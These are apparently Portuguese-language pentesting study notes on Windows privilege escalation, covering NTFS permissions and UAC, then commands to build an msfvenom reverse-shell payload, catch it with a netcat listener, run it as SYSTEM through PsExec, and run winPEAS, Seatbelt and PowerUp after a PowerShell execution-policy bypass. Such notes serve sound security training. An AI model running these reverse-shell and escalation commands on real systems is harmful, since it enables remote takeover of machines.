# Windows PrivEsc

## File System

O sistema de arquivo usado nas versões modernas do Windows é o **New Technology File System** or simplesmente **NTFS**.

Antes do NTFS, era utilizado o **FAT16/32** e **HPFS**.

As permissões que existem no NTFS podem ser vistas em **Propriedades->Security->Group or User**, elas são :

1. Full control
2. Modify
3. Read & Execute
4. List folder contents
5. Read
6. Write

## UAC

O **User Account Control** é o que permite que um usuário com privilégios de Local Administrator não logue à máquina utilizando todo esse privilégio. O UAC apenas cede os privilégios admin quando o usuário necessita executar um programa como admin.

O UAC pode ser alterado e até mesmo desativado a partir do USER ACCOUNT CONTROL SETTINGS ou com o comando ` UserAccountControlSettings.exe`

## Gaining Shell

### Rev Shell

Existem diversas maneiras de ganhar um reverse shell no windows, como por exemplo com msfvenom

1. Gerar o Payload

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f exe -o reverse.exe`

2. Utilizar Netcat para ouvir uma conexão

`nc -nlvp 53`

3. Copiar e executar o payload no Windows

`copy \\192.168.0.33\tools\reverse.exe .`

4. Executar o reverse.exe

## ADMIN -> System

Para escalar de um admin para um full system privileges user, podemos utilizar o PsExec tool do Windows Sysinternals. [Download aqui](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)

`.\PsExec64.exe -accepteula -i -s C:\PrivEsc\reverse.exe

## Tools

### winPEAS

A ferramenta que parece ser a melhor mantida em ver misconfigs. Por isso a ideia é tê-la como main tool

https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS

1. Antes de rodar adicionar a registry key para vermos as misconfigs em cores 

`reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1`

2. Reabrir o terminal e executar o comando

`.\winPEASany.exe --help`

### Seatbelt

Ferramente de Enumeration : https://github.com/GhostPack/Seatbelt

`.\Seatbelt.exe`

### PowerUp

PowerUp é uma ferramenta que acha misconfigurations que podem resultar em privilege escalation. [Link](https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1)

1. Precisamos abrir o Power Shell

`powershell -exec bypass`

2. Executar o PowerUp

`. .\PowerUp.ps1`

3. Fazer os Checks

`Invoke-AllChecks`